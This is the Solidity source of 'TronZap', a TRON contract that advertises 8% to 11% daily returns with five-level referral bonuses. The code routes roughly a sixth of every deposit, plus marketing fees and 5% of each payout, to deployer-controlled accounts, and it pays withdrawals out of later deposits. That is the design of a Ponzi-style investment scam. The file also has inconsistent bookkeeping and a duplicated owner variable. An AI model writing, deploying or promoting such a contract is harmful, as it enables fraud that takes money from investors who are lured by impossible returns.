//SourceUnit: TronZap.sol

pragma solidity 0.5.10;

/*! TronZap.sol | (c) 2020 Development by Zaplight TEAM (www.tronzap.com) 

------------------------------------
Crowdfunding & Crowdsharing project
 Website :  https://tronzap.com  
 Channel :  https://t.me/tronzap
------------------------------------ 
 CONTRACT MANAGEMENT:
------------------------------------

8% to 11% daily ROI FOR YOU 
6% direct referral level 1
4% referred level 2 
2% referred level 3 
2% referred level 4 
1% referred level 5
1% refund level 0 
------------------------------------
AutoReinvest 50% to generate compound interest
------------------------------------
*/

contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract TronZap is Ownable {
    struct Tarif {
        uint8 life_days;
        uint8 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint40 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address payable public owner;
    address payable private teamAccount_;
    address payable private marketing1Account_;
    address payable private marketing2Account_;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    
    uint8[] public ref_bonuses; 

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;
        teamAccount_ = msg.sender;
        marketing1Account_ = msg.sender;
        marketing2Account_ = msg.sender;

        tarifs.push(Tarif(40, 80));//Will be multiplied by 10 beacuse of uint8 limitations
        tarifs.push(Tarif(40, 90));
        tarifs.push(Tarif(40, 100));
        tarifs.push(Tarif(40, 110));
        
        ref_bonuses.push(6);
        ref_bonuses.push(4);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(1);
    }
    
    function setMarketing1Account(address payable _newMarketing1Account) public onlyOwner {
        require(_newMarketing1Account != address(0));
        marketing1Account_ = _newMarketing1Account;
    }

    function getMarketing1Account() public view onlyOwner returns (address) {
        return marketing1Account_;
    }
    
    function setMarketing2Account(address payable _newMarketing2Account) public onlyOwner {
        require(_newMarketing2Account != address(0));
        marketing2Account_ = _newMarketing2Account;
    }

    function getMarketing2Account() public view onlyOwner returns (address) {
        return marketing2Account_;
    }

    function setTeamAccount(address payable _newTeamAccount) public onlyOwner {
        require(_newTeamAccount != address(0));
        teamAccount_ = _newTeamAccount;
    }

    function getTeamAccount() public view onlyOwner returns (address) {
        return teamAccount_;
    }

    function _payout(address _addr) private {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        
        player.total_invested+= (payout/2);
        invested+=(payout/2);
        owner.transfer(payout/20);
        player.deposits.push(Deposit({
            tarif: 0,
            amount: payout/5,
            time: uint40(block.timestamp)
        }));
        payout=payout*1/2;
        
        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            else {
                players[_addr].direct_bonus += _amount / 100;
                direct_bonus += _amount / 100;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 10e7, "Zero amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 50000, "Max 50000 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;
        _refPayout(msg.sender, msg.value);
        marketing1Account_.transfer(msg.value * 2 / 100);
        marketing2Account_.transfer(msg.value * 2 / 100);
        teamAccount_.transfer(msg.value / 6);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);
            
            
            
    
            if(from < to) {
                
                    if(player.total_invested<1000e7){
                        value += dep.amount * (to - from) * 80 * 10 / 100 / 8640000;
                    }
                    if(player.total_invested>=1000e7){
                        value += dep.amount * (to - from) * 90 * 10 / 100 / 8640000;
                    }
                    if(player.total_invested>=10000e7){
                        value += dep.amount * (to - from) * 10 * 10 / 100 / 8640000; // (90+10)*10/100= 10%
                    }
                    if(player.total_invested>=50000e7){
                        value += dep.amount * (to - from) * 10 * 10 / 100 / 8640000; // (100+10)*10/100= 11%
                    }
            }
        }
        
        return value;
    }


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[5] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }
}